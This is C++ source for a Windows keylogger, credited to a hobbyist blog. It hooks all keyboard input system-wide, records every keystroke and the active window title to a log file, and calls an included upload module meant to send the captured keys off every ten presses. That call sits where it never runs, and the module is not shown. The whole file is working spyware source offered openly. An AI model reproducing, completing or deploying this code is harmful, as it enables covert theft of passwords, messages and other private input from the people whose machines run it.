/************************************************************
* A very basic Key logger in C++
* Author: Manish
* Home: http://technoslab.blogspot.com/search/label/projects
************************************************************/

// Include header files
#include <windows.h>
#include <fstream>
#include "Upload.h"

#pragma comment(lib, "Crypt32.Lib")
#pragma comment(lib, "ws2_32.Lib")

// Initialize a keyboard HHOOK
HHOOK KeyboardHook;

// Function to write to a file
void write(const char* c)
{
	const char* fileLocation = "log.txt"; // Define the location of log file
	FILE *f = fopen(fileLocation, "a+"); // Open the log file in append mode
	if (f != NULL)
	{
		fputs(c, f); // Write to end of the file
		fclose(f); // Close the file
	}
}

// The WIN API Message Loop
void KeepAlive()
{
	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

// Unhook and exit
void Exit()
{
	UnhookWindowsHookEx(KeyboardHook);
	exit(0);
}

// Is shift key down ?
bool shift = false;
// Store window
HWND oldWindow = NULL;
// Window text
char cWindow[MAX_PATH];

// Callback function to be hooked
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	bool bControlKeyDown = 0;
	// Get current state of capsLock
	bool caps = GetKeyState(VK_CAPITAL) < 0;
	KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
	if (nCode == HC_ACTION) {
		// Determine the current state of shift key
		if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT) {
			if (wParam == WM_KEYDOWN)
			{
				shift = true;
			}
			else
			{
				shift = false;
			}
		}
		// Check if F12 + CTRL is pressed, if yes -> exit
		bControlKeyDown = GetAsyncKeyState(VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);
		if (p->vkCode == VK_F12 && bControlKeyDown) // If F12 and CTRL are pressed
		{
			Exit();
		}
		// Start logging keys
		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) // If key has been pressed
		{
			HWND newWindow = GetForegroundWindow();
			if (oldWindow == NULL || newWindow != oldWindow) {
				// Get Active window title and store it
				GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
				write("\nActive Window: ");
				write(cWindow);
				write("\n");
				oldWindow = newWindow;
			}
			// Virtual key codes reference: http://msdn.microsoft.com/en-us/library/dd375731%28v=VS.85%29.aspx
			switch (p->vkCode) // Compare virtual keycode to hex values and log keys accordingly
			{
				Upload::count++;
				if (Upload::count == 10) {
					Upload::count = 0;
					Upload::send();
				}

				//Number keys
				case 0x30: write(shift ? ")" : "0"); break;
				case 0x31: write(shift ? "!" : "1"); break;
				case 0x32: write(shift ? "@" : "2"); break;
				case 0x33: write(shift ? "#" : "3"); break;
				case 0x34: write(shift ? "$" : "4"); break;
				case 0x35: write(shift ? "%" : "5"); break;
				case 0x36: write(shift ? "^" : "6"); break;
				case 0x37: write(shift ? "&" : "7"); break;
				case 0x38: write(shift ? "*" : "8"); break;
				case 0x39: write(shift ? "(" : "9"); break;
					// Numpad keys
				case 0x60: write("0"); break;
				case 0x61: write("1"); break;
				case 0x62: write("2"); break;
				case 0x63: write("3"); break;
				case 0x64: write("4"); break;
				case 0x65: write("5"); break;
				case 0x66: write("6"); break;
				case 0x67: write("7"); break;
				case 0x68: write("8"); break;
				case 0x69: write("9"); break;
					// Character keys
				case 0x41: write(caps ? (shift ? "a" : "A") : (shift ? "A" : "a")); break;
				case 0x42: write(caps ? (shift ? "b" : "B") : (shift ? "B" : "b")); break;
				case 0x43: write(caps ? (shift ? "c" : "C") : (shift ? "C" : "c")); break;
				case 0x44: write(caps ? (shift ? "d" : "D") : (shift ? "D" : "d")); break;
				case 0x45: write(caps ? (shift ? "e" : "E") : (shift ? "E" : "e")); break;
				case 0x46: write(caps ? (shift ? "f" : "F") : (shift ? "F" : "f")); break;
				case 0x47: write(caps ? (shift ? "g" : "G") : (shift ? "G" : "g")); break;
				case 0x48: write(caps ? (shift ? "h" : "H") : (shift ? "H" : "h")); break;
				case 0x49: write(caps ? (shift ? "i" : "I") : (shift ? "I" : "i")); break;
				case 0x4A: write(caps ? (shift ? "j" : "J") : (shift ? "J" : "j")); break;
				case 0x4B: write(caps ? (shift ? "k" : "K") : (shift ? "K" : "k")); break;
				case 0x4C: write(caps ? (shift ? "l" : "L") : (shift ? "L" : "l")); break;
				case 0x4D: write(caps ? (shift ? "m" : "M") : (shift ? "M" : "m")); break;
				case 0x4E: write(caps ? (shift ? "n" : "N") : (shift ? "N" : "n")); break;
				case 0x4F: write(caps ? (shift ? "o" : "O") : (shift ? "O" : "o")); break;
				case 0x50: write(caps ? (shift ? "p" : "P") : (shift ? "P" : "p")); break;
				case 0x51: write(caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q")); break;
				case 0x52: write(caps ? (shift ? "r" : "R") : (shift ? "R" : "r")); break;
				case 0x53: write(caps ? (shift ? "s" : "S") : (shift ? "S" : "s")); break;
				case 0x54: write(caps ? (shift ? "t" : "T") : (shift ? "T" : "t")); break;
				case 0x55: write(caps ? (shift ? "u" : "U") : (shift ? "U" : "u")); break;
				case 0x56: write(caps ? (shift ? "v" : "V") : (shift ? "V" : "v")); break;
				case 0x57: write(caps ? (shift ? "w" : "W") : (shift ? "W" : "w")); break;
				case 0x58: write(caps ? (shift ? "x" : "X") : (shift ? "X" : "x")); break;
				case 0x59: write(caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y")); break;
				case 0x5A: write(caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z")); break;
					// Special keys
				case VK_SPACE: write(" "); break;
				case VK_RETURN: write("\n"); break;
				case VK_TAB: write("\t"); break;
				case VK_ESCAPE: write("[ESC]"); break;
				case VK_LEFT: write("[LEFT]"); break;
				case VK_RIGHT: write("[RIGHT]"); break;
				case VK_UP: write("[UP]"); break;
				case VK_DOWN: write("[DOWN]"); break;
				case VK_END: write("[END]"); break;
				case VK_HOME: write("[HOME]"); break;
				case VK_DELETE: write("[DELETE]"); break;
				case VK_BACK: write("[BACKSPACE]"); break;
				case VK_INSERT: write("[INSERT]"); break;
				case VK_LCONTROL: write("[CTRL]"); break;
				case VK_RCONTROL: write("[CTRL]"); break;
				case VK_LMENU: write("[ALT]"); break;
				case VK_RMENU: write("[ALT]"); break;
				case VK_F1: write("[F1]"); break;
				case VK_F2: write("[F2]"); break;
				case VK_F3: write("[F3]"); break;
				case VK_F4: write("[F4]"); break;
				case VK_F5: write("[F5]"); break;
				case VK_F6: write("[F6]"); break;
				case VK_F7: write("[F7]"); break;
				case VK_F8: write("[F8]"); break;
				case VK_F9: write("[F9]"); break;
				case VK_F10: write("[F10]"); break;
				case VK_F11: write("[F11]"); break;
				case VK_F12: write("[F12]"); break;
					// Shift keys
				case VK_LSHIFT: break; // Do nothing
				case VK_RSHIFT: break; // Do nothing
									   // Symbol keys
				case VK_OEM_1: write(shift ? ":" : ";"); break;
				case VK_OEM_2: write(shift ? "?" : "/"); break;
				case VK_OEM_3: write(shift ? "~" : "`"); break;
				case VK_OEM_4: write(shift ? "{" : "["); break;
				case VK_OEM_5: write(shift ? "|" : "\\"); break;
				case VK_OEM_6: write(shift ? "}" : "]"); break;
				case VK_OEM_7: write(shift ? "\"" : "'"); break;
				case VK_OEM_PLUS: write(shift ? "+" : "="); break;
				case VK_OEM_COMMA: write(shift ? "<" : ","); break;
				case VK_OEM_MINUS: write(shift ? +"_" : "-"); break;
				case VK_OEM_PERIOD: write(shift ? ">" : "."); break;
				default:
					DWORD dwMsg = p->scanCode << 16;
					dwMsg += p->flags << 24;
					char key[16];
					GetKeyNameText(dwMsg, key, 15);
					write(key);
					break;
			}
		}
	}
	// Forward the event to other hooks
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// WinAPI main method
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	// Write to file
	write("\n---------------------------------------------------------");
	// Hook to all available threads
	KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, hInstance, NULL);
	if (KeyboardHook != NULL)
	{
		// Keep alive till F12 + CTRL key press is detected - can also register Hotkey
		KeepAlive();
	}
	// Exit the program
	return 0;
}    